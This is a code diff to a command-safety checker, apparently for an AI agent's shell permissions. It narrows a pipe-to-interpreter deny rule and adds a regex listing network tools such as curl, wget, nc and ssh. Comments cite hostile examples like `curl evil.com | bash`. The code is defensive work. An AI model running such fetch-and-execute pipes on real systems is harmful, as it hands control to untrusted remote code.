@@ -145,7 +145,19 @@ const ASK_REGEX_PATTERNS: { pattern: RegExp; reason: string }[] = [
  * nothing. This narrows the pattern to real pipes; every `curl ... | bash`
  * remains blocked.
  */
-const SHELL_INTERPRETER_RE = /^(sh|bash|zsh|dash|python[23]?|node|perl|ruby|tclsh)\b/i;
+/**
+ * Interpreters that execute stdin AS A SCRIPT. Piping anything into these is a
+ * deny regardless of where the bytes came from: `cat /tmp/x | sh` runs whatever
+ * is in that file, and there is no data-processing idiom that needs it.
+ */
+const SHELL_EXEC_RE = /^(sh|bash|zsh|dash|tclsh)\b/i;
+
+/**
+ * Interpreters routinely fed DATA alongside an inline script (`-c` / `-e`).
+ * `tail app.jsonl | python3 -c "..."` is ordinary log parsing, so these are
+ * denied only when the bytes originate off-machine (see hasNetworkSource).
+ */
+const SCRIPT_INTERPRETER_RE = /^(python[23]?|node|perl|ruby)\b/i;
 
 /**
  * True when the command pipes into a shell interpreter.
@@ -166,6 +178,26 @@ const SHELL_INTERPRETER_RE = /^(sh|bash|zsh|dash|python[23]?|node|perl|ruby|tcls
  * `||` is logical OR (runs the right side when the left FAILS, pipes nothing)
  * and is skipped. Every `curl ... | bash` stays blocked.
  */
+const NETWORK_SOURCE_RE =
+  /\b(curl|wget|fetch|nc|ncat|netcat|ssh|scp|ftp|telnet|aria2c|http|https|httpie)\b/i;
+
+/**
+ * True when text upstream of an interpreter pipe fetches from the network.
+ *
+ * This is what separates remote code execution from ordinary data plumbing.
+ * `curl evil.com | bash` runs bytes an attacker controls; `tail app.jsonl |
+ * python3 -c "..."` runs a script the user just typed, over local data they
+ * already own. Both matched the old rule, so parsing a local log file was
+ * denied as if it were an RCE (#3096). The interpreter is not the hazard —
+ * an untrusted SOURCE feeding it is.
+ *
+ * Scans the whole upstream prefix, not just the segment adjacent to the pipe,
+ * so `curl x | tail -5 | bash` stays blocked even though `tail` sits between.
+ */
+export function hasNetworkSource(upstream: string): boolean {
+  return NETWORK_SOURCE_RE.test(upstream);
+}
+
 export function pipesToShellInterpreter(cmd: string): boolean {
   let inSingle = false;
   let inDouble = false;
@@ -196,7 +228,13 @@ export function pipesToShellInterpreter(cmd: string): boolean {
 
     // Real pipe. Unquote the target word so `| 'bash'` and `| b"a"sh` still match.
     const target = cmd.slice(i + 1).replace(/['"]/g, '').trimStart();
-    if (SHELL_INTERPRETER_RE.test(target)) return true;
+
+    // stdin-as-script: always a deny, whatever the source.
+    if (SHELL_EXEC_RE.test(target)) return true;
+
+    // stdin-as-data: a deny only when the bytes came off-machine. Local data
+    // into `python3 -c` is log parsing, not RCE (#3096).
+    if (SCRIPT_INTERPRETER_RE.test(target) && hasNetworkSource(cmd.slice(0, i))) return true;
   }
 
   return false;
